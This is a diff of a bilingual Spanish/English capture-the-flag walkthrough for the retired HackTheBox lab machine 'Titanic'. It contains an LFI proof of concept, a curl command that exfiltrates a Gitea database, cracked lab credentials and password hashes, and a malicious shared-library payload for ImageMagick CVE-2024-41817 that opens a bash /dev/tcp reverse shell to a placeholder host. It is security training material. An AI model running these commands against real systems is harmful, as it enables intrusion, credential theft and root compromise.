@@ -1,144 +1,158 @@
-1,Recon
-port scan
-```
-nmap -sC -sV -Pn 10.10.11.55 -oN ./nmap.txt
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 11:19 AEDT
-Nmap scan report for 10.10.11.55
-Host is up (0.012s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
-|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
-80/tcp open  http    Apache httpd 2.4.52
-|_http-title: Did not follow redirect to http://titanic.htb/
-|_http-server-header: Apache/2.4.52 (Ubuntu)
-Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+# Titanic [Easy]
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds
-```
-Page check
-![[Screenshot 2025-02-16 at 11.25.07 AM.png]]
-By using the ffuf to enumerate the web-contents, I can only find the `/book`, and nothing here.
+> **ES:** Máquina Linux con app Flask de reservas y Gitea interno; se abusa un LFI para filtrar credenciales y un cron de ImageMagick para escalar a root.
+> **EN:** Linux box with a Flask booking app and internal Gitea; LFI leaks credentials and an ImageMagick cron job leads to root.
 
-But we can also find another sub-domain here `dev.titanic.htb`
-![](images/Pasted%20image%2020250216112921.png)
-And I can find the version of Gitea `Version: 1.22.1`
-From `Exploit` label, we can find a public repository
-![](images/Pasted%20image%2020250216113341.png)
-Then we can find the source code of the main-domain service, and we can find the LFI for `/download`
-![](images/Pasted%20image%2020250216113814.png)
-We can try to prove it
-http://titanic.htb/download?ticket=../../../../etc/passwd
-Then we get the `/etc/passwd` file
-```
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-pollinate:x:105:1::/var/cache/pollinate:/bin/false
-sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
-syslog:x:107:113::/home/syslog:/usr/sbin/nologin
-uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
-tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
-landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
-fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
-usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-developer:x:1000:1000:developer:/home/developer:/bin/bash
-lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
-dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-_laurel:x:998:998::/var/log/laurel:/bin/false
-```
-In this place, developer would be our target here, we can try to get its `id_rsa`, but there is no id_rsa to get
-So, let's try to get the `gitea.db` from the home template of developer
-`curl "http://titanic.htb/download?ticket=../../../../../../../../../../home/developer/gitea/data/gitea/gitea.db" --output gitea.db`
-Then we can get the hash of developer
-```
-sqlite> select * from user;
-1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
-2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1739647463|1739647463|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
-3|test|test||test@test.com|0|enabled|9dc4f953ea5319eaeb3ac3e50d253993198634870708bd794bd1efa6fd43de0ba112781df3809adfef01648f54211201e2eb|pbkdf2$50000$50|0|0|0||0|||46c8c984551f7de9b64ea4e6373e2b62|e4b82a344a4e3e4d3f98fda81ea1abfc|en-US||1739652077|1739652962|1739652962|0|-1|1|0|0|0|0|1|0|b642b4217b34b1e8d3bd915fc65c4452|test@test.com|0|0|0|0|0|0|0|0|0|unified|gitea-auto|0
-4|abc|abc||abc@def.com|0|enabled|ad189d5a43407d4aa431db8821e420028a1610f24d05114e6dbd64021bdde0931a3532de8d99bdf12033cc86b09f3730f607|pbkdf2$50000$50|0|0|0||0|||165262c5ef766cfb880c2f65604241ab|b0e49dd381b0d68a693954d003106287|en-US||1739657270|1739658230|1739657270|0|-1|1|0|0|0|0|1|0|b188d046267bb5cddbc457580551297d|abc@def.com|0|0|0|0|0|0|0|0|0|unified|gitea-auto|0
-5|admin1|admin1||admin1@titanic.htb|0|enabled|e0bb63860d33f22300e20a3f481ebaa9860c76ef5c6c5dc685ecd53d1c8d635a1f44f11b88230547209846b1373cd6770423|pbkdf2$50000$50|0|0|0||0|||64b82b0a562e6d38ba2f345eb5c491b3|8532b61d0f8eb41f47081e0ecadda6d2|en-US||1739663217|1739663217|1739663217|0|-1|1|0|0|0|0|1|0|1882b2110b401e1b49aaffb53a1782b2|admin1@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
+| Campo | Valor |
+|-------|-------|
+| **Dificultad** | Easy |
+| **OS** | Linux |
+| **Estado** | Retired |
+| **Maker** | [verificar en app.hackthebox.com/machines/Titanic] |
+| **URL** | https://app.hackthebox.com/machines/Titanic |
+| **IP lab** | 10.10.11.55 |
+| **Fecha de resolución** | 2026-09-24 |
 
-```
-By cracking this hash and we can get the password of developer `developer:25282528`
-Then we can use ssh to get the user shell.
+---
 
-2, shell as root
-Firstly I would like check the netstate and `sudo -l`
-```
-developer@titanic:~$ sudo -l
-[sudo] password for developer: 
-Sorry, user developer may not run sudo on titanic.
-developer@titanic:~$ netstat -ntlp
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:45201         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1167/python3        
-tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
-tcp6       0      0 :::80                   :::*                    LISTEN      -                   
-tcp6       0      0 :::22                   :::*                    LISTEN      - 
-```
-Port 5000 is the flask service, port 3000 is the gitea docker image.
+## 🎯 Objetivo / Goal
 
-Come to `/opt/app/static/assets/images`
-Then we can check the version of `ImageMagick`
-```
-developer@titanic:/opt/app/static/assets/images$ magick --version
-Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
-Copyright: (C) 1999 ImageMagick Studio LLC
-License: https://imagemagick.org/script/license.php
-Features: Cipher DPC HDRI OpenMP(4.5) 
-Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
-Compiler: gcc (9.4)
+> **ES:** Conseguir `user.txt` y `root.txt` vía LFI (`download?ticket=`) → robo de `gitea.db` → SSH como `developer` → abuso de cron `identify_images.sh` (ImageMagick CVE-2024-41817).
+> **EN:** Get `user.txt` and `root.txt` via LFI (`download?ticket=`) → `gitea.db` theft → SSH as `developer` → `identify_images.sh` cron abuse (ImageMagick CVE-2024-41817).
 
-```
-Then we can find the exploit of this version
-```
-https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
-Arbitrary Code Execution in `AppImage` version `ImageMagick`
+---
 
+## 🛠️ Herramientas usadas / Tools used
+
+- [ ] nmap
+- [ ] ffuf (contenidos `/book`, subdominio `dev.titanic.htb`)
+- [ ] curl (LFI, exfiltración `app.py`/`gitea.db`)
+- [ ] sqlite3 + gitea2hashcat.py + hashcat/john (hash pbkdf2 de Gitea)
+- [ ] ssh
+- [ ] pspy64 + gcc (privesc ImageMagick)
+
+---
+
+## 📋 Pasos / Steps
+
+### Paso 1 — Reconocimiento / Recon
+
+> **ES:** Solo 22/SSH y 80/HTTP (Apache → Flask). El vhost es `titanic.htb`; añadir a `/etc/hosts`. `ffuf` halla `/book` y el subdominio `dev.titanic.htb` (Gitea 1.22.1 con repo público del código de la app).
+> **EN:** Only 22/SSH and 80/HTTP (Apache → Flask). Vhost is `titanic.htb`; add to `/etc/hosts`. `ffuf` finds `/book` and subdomain `dev.titanic.htb` (Gitea 1.22.1 with a public repo of the app code).
+
+```bash
+nmap -sC -sV -Pn 10.10.11.55 -oN nmap.txt
+echo '10.10.11.55 titanic.htb dev.titanic.htb' | sudo tee -a /etc/hosts
+curl -s http://titanic.htb/ | head -40
 ```
-So the payload would be 
+
+**Resultado / Result:** 22/tcp OpenSSH 8.9p1, 80/tcp Apache 2.4.52 → Flask (Werkzeug, app de reserva de camarotes en 127.0.0.1:5000; Gitea en 127.0.0.1:3000, SSH interno 2222). Capturas en `img/image_20250323-152319.png` y en `images/`.
+
+---
+
+### Paso 2 — Enumeración / Enumeration
+
+> **ES:** El formulario `/book` guarda tickets JSON (`TICKETS_DIR=tickets`, uuid) y `/download?ticket=` concatena sin sanear `../` (`os.path.join` + `send_file`). Se prueba con `/etc/passwd` (revela `developer` uid 1000) y se extrae `app.py` (sin RCE: solo Flask + JSON).
+> **EN:** The `/book` form stores JSON tickets (`TICKETS_DIR=tickets`, uuid) and `/download?ticket=` concatenates without sanitizing `../` (`os.path.join` + `send_file`). Test with `/etc/passwd` (reveals `developer` uid 1000) and extract `app.py` (no RCE: plain Flask + JSON).
+
+```bash
+# PoC LFI:
+curl -s 'http://titanic.htb/download?ticket=../../../../etc/passwd'
+# root:x:0:0... developer:x:1000:1000:developer:/home/developer:/bin/bash ...
+curl -s 'http://titanic.htb/download?ticket=../app.py' -o app.py
+grep -n 'TICKETS_DIR\|download\|gitea\|MYSQL' app.py
+# TICKETS_DIR = "tickets"; download_ticket(): os.path.join(TICKETS_DIR, ticket) -> send_file
 ```
-gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+
+**Resultado / Result:** LFI confirmado. Sin `id_rsa` de `developer` accesible: el objetivo pasa a ser la base de Gitea. Capturas del flujo de reserva en `img/`.
+
+---
+
+### Paso 3 — Acceso inicial (foothold) / Initial access
+
+> **ES:** Con el LFI se descarga la base de Gitea (`/home/developer/gitea/data/gitea/gitea.db`), se listan usuarios (`administrator/developer/test/abc/admin1`, hashes `pbkdf2$50000$50`) y se crackea el de `developer` offline (`gitea2hashcat.py` + rockyou) → SSH.
+> **EN:** Use LFI to download the Gitea DB (`/home/developer/gitea/data/gitea/gitea.db`), list users (`administrator/developer/test/abc/admin1`, `pbkdf2$50000$50` hashes) and crack `developer`'s offline (`gitea2hashcat.py` + rockyou) → SSH.
+
+```bash
+curl "http://titanic.htb/download?ticket=../../../../../../../../../../home/developer/gitea/data/gitea/gitea.db" --output gitea.db
+sqlite3 gitea.db "SELECT name, passwd, salt FROM user;"
+python3 gitea2hashcat.py gitea.db > hashes.txt
+hashcat -m <modo-gitea-pbkdf2> hashes.txt /usr/share/wordlists/rockyou.txt
+# developer:25282528 (credencial de laboratorio retirado)
+ssh developer@titanic.htb
+```
+
+**Resultado / Result:** Hash crackeado → shell como `developer`. Se lee `user.txt` en su home (formato parcial ofuscado).
+
+---
+
+### Paso 4 — Usuario (user.txt) / User
+
+> **ES:** La sesión SSH como `developer` ya da el flag de usuario. Sin `sudo` (`Sorry, user developer may not run sudo`). Se verifica `id` y se estabiliza la shell.
+> **EN:** The `developer` SSH session already yields the user flag. No `sudo` (`Sorry, user developer may not run sudo`). Verify `id` and stabilize the shell.
+
+```bash
+id; ls -l ~/user.txt
+cat ~/user.txt  # formato parcial ofuscado
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+netstat -ntlp  # 127.0.0.1:5000 flask, 127.0.0.1:3000 gitea, 127.0.0.1:2222
+```
+
+---
+
+### Paso 5 — Root (root.txt) / Privilege escalation
+
+> **ES:** `linpeas` no muestra nada útil, pero `pspy64` revela un cron invisible que ejecuta `/opt/scripts/identify_images.sh` como root (`cd /opt/app/static/assets/images; truncate metadata.log; find ... -name "*.jpg" | xargs magick identify`). ImageMagick 7.1.1-35 es vulnerable a CVE-2024-41817 (GHSA-8rxc-922v-phg8, hijack de `libxcb`): se planta `libxcb.so.1` maliciosa con constructor (reverse shell o `cat /root/root.txt > /tmp/root.txt`) en ese directorio y el cron la carga como root.
+> **EN:** `linpeas` shows nothing, but `pspy64` reveals an invisible cron running `/opt/scripts/identify_images.sh` as root (`cd /opt/app/static/assets/images; truncate metadata.log; find ... -name "*.jpg" | xargs magick identify`). ImageMagick 7.1.1-35 is vulnerable to CVE-2024-41817 (GHSA-8rxc-922v-phg8, `libxcb` hijack): drop a malicious `libxcb.so.1` with constructor (reverse shell or `cat /root/root.txt > /tmp/root.txt`) in that dir; cron loads it as root.
+
+```bash
+cat /opt/scripts/identify_images.sh
+./pspy64 -f=true  # FS: OPEN /opt/scripts/identify_images.sh (periódico)
+magick --version  # ImageMagick 7.1.1-35 Q16-HDRI x86_64
+cd /opt/app/static/assets/images/
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << 'EOF'
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-
-void __attribute__((constructor)) init() {
-    system("cat /root/root.txt > /tmp/root.txt");
+__attribute__((constructor)) void init(){
+    system("/bin/bash -c 'bash -i >& /dev/tcp/<TU-IP>/8888 0>&1'");
     exit(0);
 }
 EOF
-
-magick /dev/null /dev/null
-
-cat /tmp/root.txt
+nc -lvnp 8888
+# root@titanic:/opt/app/static/assets/images# whoami -> root
+cat /root/root.txt  # formato: 4fce... (ofuscado)
 ```
+
+**Resultado / Result:** Callback como `root` vía ImageMagick. Técnica: cron inseguro + hijack de librería compartida (CVE-2024-41817).
+
+---
+
+## 🧠 Lo aprendido / Learned
+
+> **ES:** LFI por concatenación de rutas en Flask; exfiltración de `gitea.db` y crack offline; privesc con cron + ImageMagick (CVE-2024-41817).
+> **EN:** Path-concatenation LFI in Flask; `gitea.db` exfiltration and offline cracking; cron + ImageMagick privesc (CVE-2024-41817).
+
+- [ ] Auditar `send_file`/`ticket` sin normalizar ruta
+- [ ] Gitea sqlite → hash pbkdf2 → SSH reuse
+- [ ] `pspy` para descubrir crons invisibles
+
+---
+
+## 📚 Fuentes y Referencias / Sources
+
+- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
+- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: `dev.titanic.htb`/Gitea 1.22.1, filas `user` de `gitea.db`, `developer:25282528`, payload gcc exacto) — wither/nota migrada
+- **Walkthrough de referencia:** HTB Titanic — https://0xdf.gitlab.io/2025/06/21/htb-titanic.html — 0xdf
+- **Referencia técnica:** Arbitrary Code Execution in ImageMagick (CVE-2024-41817) — https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8 — ImageMagick
+- **Fecha de acceso:** 2026-09-24
+- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
+
+---
+
+## ⚠️ Aviso Legal / Disclaimer
+
+> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
+> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.
+
+_Fecha de edición: 2026-09-24_
